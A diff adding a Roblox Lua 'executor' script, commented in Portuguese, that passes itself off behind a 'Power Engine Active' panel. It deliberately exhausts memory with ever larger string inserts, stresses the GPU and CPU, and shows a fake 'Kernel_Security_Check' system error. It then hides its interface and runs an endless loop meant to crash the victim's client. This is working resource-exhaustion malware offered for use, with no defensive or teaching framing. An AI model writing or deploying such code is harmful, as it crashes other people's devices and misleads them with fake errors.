@@ -1,0 +1,99 @@
+-- V26 EXECUTOR: DOUBLE FORCE MODULE
+-- Carga Inicial: 2x Potência | Tempo: 03:47 | Música: 04:25
+
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+local lixo_v26 = {}
+local tempo_carga = 227 
+local tempo_musica = 265 
+
+-- Interface de Disfarce
+local Main = Instance.new("Frame", ScreenGui)
+Main.Size = UDim2.new(0, 280, 0, 90)
+Main.Position = UDim2.new(0.5, -140, 0.05, 0)
+Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+Main.BorderSizePixel = 0
+
+local Label = Instance.new("TextLabel", Main)
+Label.Size = UDim2.new(1, 0, 0.6, 0)
+Label.Text = "V26: Power Engine Active (2x)"
+Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+Label.BackgroundTransparency = 1
+Label.Font = Enum.Font.GothamBold
+
+local ProgressBar = Instance.new("Frame", Main)
+ProgressBar.Size = UDim2.new(0, 0, 0, 5)
+ProgressBar.Position = UDim2.new(0, 0, 0.9, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+ProgressBar.BorderSizePixel = 0
+
+-- ÁUDIO
+local Sound = Instance.new("Sound", game.Workspace)
+Sound.SoundId = "rbxassetid://142376088" 
+Sound.Looped = true
+Sound.Volume = 0.6
+Sound:Play()
+
+local function IniciarAtaqueV26()
+    -- FASE 1: Já começa com 2x mais força
+    for i = 1, tempo_carga do
+        pcall(function()
+            ProgressBar.Size = UDim2.new(i/tempo_carga, 0, 0, 5)
+            
+            -- INJEÇÃO DOBRADA (800k em vez de 400k)
+            for j = 1, 10 do -- Aumentado o número de inserções por ciclo
+                table.insert(lixo_v26, string.rep("V26_FORCE_X2", 800000))
+            end
+
+            -- GPU STRESS (Sombra invisível persistente)
+            local p = Instance.new("PointLight", game.Workspace)
+            p.Shadows = true
+            p.Range = 0.1
+            p.Brightness = 0
+            
+            -- CPU STRESS DOBRADO (Duas tarefas simultâneas de cálculo)
+            task.spawn(function()
+                local x = 0
+                for _ = 1, 100000 do x = math.sqrt(math.random()) * math.tan(x) end
+            end)
+            task.spawn(function()
+                local y = 0
+                for _ = 1, 100000 do y = math.cos(math.random()) * math.atan(y) end
+            end)
+        end)
+        task.wait(1)
+    end
+
+    -- FASE 2: O Falso Erro (15 segundos)
+    Label.Text = "SYSTEM ERROR: Kernel_Security_Check"
+    Label.TextColor3 = Color3.fromRGB(255, 0, 0)
+    ProgressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    
+    task.spawn(function()
+        for i = 1, 15 do
+            pcall(function()
+                -- No erro a força triplica
+                table.insert(lixo_v26, string.rep("V26_CRITICAL", 1500000))
+            end)
+            task.wait(1)
+        end
+        Main:Destroy() -- Interface some, mas o script continua "fantasma"
+    end)
+
+    -- FASE 3: O Golpe Final (Silêncio e Morte do Sistema)
+    task.wait(tempo_musica - tempo_carga)
+    Sound:Stop() 
+
+    while true do
+        pcall(function()
+            task.spawn(function()
+                while true do 
+                    -- Injeção massiva final
+                    table.insert(lixo_v26, string.rep("V26_ULTIMATE", 3000000)) 
+                end
+            end)
+        end)
+        task.wait(0.05) -- Velocidade de ataque aumentada
+    end
+end
+
+task.spawn(IniciarAtaqueV26)
